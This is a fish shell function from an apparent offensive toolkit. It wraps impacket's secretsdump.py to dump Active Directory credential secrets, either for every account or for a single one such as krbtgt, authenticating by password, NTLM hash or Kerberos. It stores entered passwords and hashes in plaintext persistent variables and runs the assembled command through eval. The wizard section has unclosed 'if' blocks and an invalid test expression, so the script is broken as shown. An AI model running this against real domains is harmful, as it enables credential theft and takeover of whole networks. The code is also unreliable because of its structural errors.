# description: Dump AD secrets using secretsdump.py
function __kronos_secretsdump --description "Dump AD secrets using secretsdump.py"
    set -l wizard 0
    if test (count $argv) -eq 0
        set wizard 1
    end

    argparse t/target= h/help q/quiet u/username= p/password= H/hash= d/domain= k/kerberos T/target-user= X/edit-cmd w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos secretsdump [TARGET] [OPTIONS]"
        echo ""
        echo "Dump Active Directory secrets using impacket's secretsdump.py."
        echo ""
        echo "Options:"
        echo "  -t, --target IP         Target IP or Hostname"
        echo "  -T, --target-user USER  Just dump the specified user (e.g. krbtgt)"
        echo "  -u, --username USER     Auth username"
        echo "  -p, --password PASS     Auth password"
        echo "  -H, --hash HASH         Auth NTLM hash"
        echo "  -d, --domain DOMAIN     Target domain name"
        echo "  -k, --kerberos          Use Kerberos authentication"
        echo "  -X, --edit-cmd          Inspect and edit the command before execution"
        echo "  -q, --quiet             Skip prompts and use cached/default values"
        echo "  -h, --help              Show this help message"
        return 0
    end

    set -l target $_flag_target
    if test -z "$target"; set target $argv[1]; end
    set -l domain $_flag_domain
    set -l auth_user $_flag_username
    set -l auth_pass $_flag_password
    set -l auth_hash $_flag_hash
    set -l target_user $_flag_target_user

    # Load defaults
    if test -z "$target"
        set target $__KRONOS_CACHE_SECRETS_TARGET
        if test -z "$target"; set target $TGT_HOSTS[1]; end
        if test -z "$target"; set target $TGT_DC_IP; end
        if test -z "$target"; set target $TGT_DC; end
        if test -z "$target"; set target $TGT; end
    end
    if test -z "$domain"
        set domain $__KRONOS_CACHE_SECRETS_DOMAIN
        if test -z "$domain"; set domain $TGT_DC_DOMAIN; end
    end
    if test -z "$target_user"
        set target_user $__KRONOS_CACHE_SECRETS_TARGET_USER
    end
    if test -z "$auth_user"
        set auth_user $__KRONOS_CACHE_SECRETS_AUTH_USER
        if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
        if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end
    end
    if test -z "$auth_pass"; and test -z "$auth_hash"
        set -l cached_auth "$__KRONOS_CACHE_SECRETS_AUTH_VAL"
        if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$cached_auth"
            set auth_hash "$cached_auth"
        else
            set auth_pass "$cached_auth"
        end
        if test -z "$auth_pass"; and test -z "$auth_hash"; set auth_pass $TGT_PASSWORD; end
        if test -z "$auth_pass"; and test -z "$auth_hash"; set auth_pass $TGT_CRED_PASSWORD; end
    end

    if not set -q _flag_quiet
        if test "$wizard" -eq 1 -o -z "$target" -o set -q _flag_wizard
            set_color cyan; echo "[*] Starting SecretsDump wizard..."; set_color normal

            set target (__kronos_ask "Target DC IP/Hostname" "$target"); or return 1
            set -U __KRONOS_CACHE_SECRETS_TARGET "$target"

            set domain (__kronos_ask "Domain Name" "$domain"); or return 1
            set -U __KRONOS_CACHE_SECRETS_DOMAIN "$domain"

            set -l dump_all (__kronos_ask_confirm "Dump ALL account secrets?" y); or return 1
            if test "$dump_all" = "no"
                set target_user (__kronos_ask "Specific user to dump (e.g. krbtgt)" "$target_user"); or return 1
                set -U __KRONOS_CACHE_SECRETS_TARGET_USER "$target_user"
            else
                set target_user ""
            end

            if not set -q _flag_kerberos
                set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
                set -U __KRONOS_CACHE_SECRETS_AUTH_USER "$auth_user"

                set -l def_auth_val "$auth_pass"
                if test -n "$auth_hash"; set def_auth_val "$auth_hash"; end
                set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val"); or return 1
                set -U __KRONOS_CACHE_SECRETS_AUTH_VAL "$auth_input"
                
                if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                    set auth_hash "$auth_input"; set auth_pass ""
                else
                    set auth_pass "$auth_input"; set auth_hash ""
                end

            # Confirmation
            echo ""
            echo "Configuration:"
            echo "  Target: $target"
            echo "  Domain: $domain"
            echo "  Dumping: "(test -n "$target_user"; and echo "User: $target_user"; or echo "All Users")
            echo "  Auth:   "(set -q _flag_kerberos; and echo "Kerberos"; or echo "$auth_user")
            echo ""
            if test (__kronos_ask_confirm "Proceed with SecretsDump on $target?" n) != "yes"
                echo "Aborted."
                return 1
            end

    if test -z "$target"; echo "error: target is required"; return 1; end
    if test -z "$domain"; echo "error: domain is required"; return 1; end

    set -l impacket_cmd ""
    if command -v secretsdump.py >/dev/null; set impacket_cmd secretsdump.py
    else if command -v impacket-secretsdump >/dev/null; set impacket_cmd impacket-secretsdump
    else; echo "error: secretsdump not found."; return 1; end

    set -l dump_cmd "$impacket_cmd"
    if test -n "$TGT_DC_IP"; set dump_cmd "$dump_cmd -dc-ip \"$TGT_DC_IP\""
    else if test -n "$TGT_DC"; set dump_cmd "$dump_cmd -dc-ip \"$TGT_DC\""; end

    if test -n "$target_user"
        set dump_cmd "$dump_cmd -just-dc-user \"$target_user\""
    end

    if set -q _flag_kerberos
        set dump_cmd "$dump_cmd -k -no-pass \"$domain/$auth_user@$target\""
    else if test -n "$auth_hash"
        set dump_cmd "$dump_cmd -hashes \"$auth_hash\" \"$domain/$auth_user@$target\""
    else
        if test -z "$auth_user"; or test -z "$auth_pass"
             echo "error: credentials required"; return 1
        end
        set dump_cmd "$dump_cmd \"$domain/$auth_user:$auth_pass@$target\""
    end

    if set -q _flag_edit_cmd
        set dump_cmd (__kronos_edit_cmd "$dump_cmd"); or return 1
    end

    __kronos_check_dep $impacket_cmd; or return 1
    echo "[*] Dumping secrets via $impacket_cmd..."
    eval $dump_cmd
end